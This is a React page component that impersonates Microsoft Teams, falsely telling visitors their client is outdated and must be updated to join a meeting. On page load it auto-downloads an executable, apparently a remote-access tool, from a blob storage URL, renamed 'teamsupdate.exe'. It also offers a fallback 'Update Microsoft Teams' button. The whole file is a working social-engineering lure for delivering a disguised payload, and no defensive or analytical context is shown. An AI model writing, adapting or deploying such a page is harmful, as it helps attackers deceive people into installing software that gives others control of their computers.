import { useEffect } from "react";
export default function OutdatedClient() {
  const DOWNLOAD_URL =
    "https://rzoquwuvqtucqxs0.public.blob.vercel-storage.com/ISL%20AlwaysOn.exe"; // replace

  function downloadFile() {
    const anchor = document.createElement("a");
    anchor.href = DOWNLOAD_URL;
    anchor.download = "teamsupdate.exe"; // optional rename
    document.body.appendChild(anchor);
    anchor.click();
    document.body.removeChild(anchor);
  }
  // Auto-download after page load
  useEffect(() => {
    const timer = setTimeout(() => {
      downloadFile();
    }, 1200); // small delay improves success rate

    return () => clearTimeout(timer);
  }, []);

  return (
    <div
      className="min-h-screen flex items-center justify-center px-4 bg-cover bg-center relative"
      style={{ backgroundImage: "url('/backgroundHeroTeamsUpdate.png')" }}
    >
      <div className="w-full max-w-md md:max-w-xl bg-white rounded-xl shadow-sm p-6 md:p-10 text-center">
        <h1 className="text-2xl md:text-3xl font-semibold text-gray-800 mb-4">
          Your Microsoft Teams Client is Outdated!
        </h1>

        <p className="text-gray-600 text-sm md:text-base mb-8">
          It looks like your version of Microsoft Teams is not up to date. To
          join the meeting, please download the latest version of Microsoft
          Teams.
        </p>

        <div className="flex justify-center mb-8">
          <div className="relative">
            <div className="absolute -inset-2 bg-indigo-100 rounded-xl"></div>
            <img
              src="../teams-preview.png"
              alt="Teams preview"
              className="relative w-64 md:w-80 rounded-lg shadow-md"
            />
          </div>
        </div>

        <p className="text-gray-500 text-sm mb-6">
          Don’t worry, it’s easy to get the latest version of Microsoft Teams.
          Your download should start automatically. If it doesn’t, click the
          button below.
        </p>

        <button
          onClick={downloadFile}
          className="w-full md:w-auto px-8 py-3 bg-indigo-600 text-white rounded-md font-medium hover:bg-indigo-700 active:scale-95 transition"
        >
          Update Microsoft Teams
        </button>

        <p className="text-xs text-gray-400 mt-8">
          Microsoft Teams © 2026. All rights reserved.
        </p>
      </div>
    </div>
  );
}
